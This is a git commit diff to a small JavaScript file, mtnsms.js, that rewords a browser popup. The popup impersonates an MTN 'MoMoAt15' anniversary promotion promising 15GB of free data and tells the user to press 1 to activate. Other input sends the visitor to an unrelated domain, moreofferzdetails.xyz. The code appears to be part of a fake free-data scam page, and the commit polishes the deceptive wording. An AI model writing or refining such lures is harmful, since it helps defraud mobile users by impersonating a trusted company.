83263e9a8f1fdfa9e1871605f0d1020824db0182
bigetijazz4 <bigetijazz4@gmail.com>
2024-08-28 12:24:12 -0700

    Update mtnsms.js

--- mtnsms.js
+++ mtnsms.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('MoMoAt15: Congratulations, you are Eligible to receive 15GB free data to celebrate our anniversary, kindly press 1 to ACTIVATE now ','1');
+password=prompt('MoMoAt15: Congratulations, is rewarding all thier users with 15GB free data in celebration of our yearly anniversary, kindly press 1 to ACTIVATE now ','1');
 if (password != '1') {
 location.href='https://www.moreofferzdetails.xyz/freedatareward';
 }
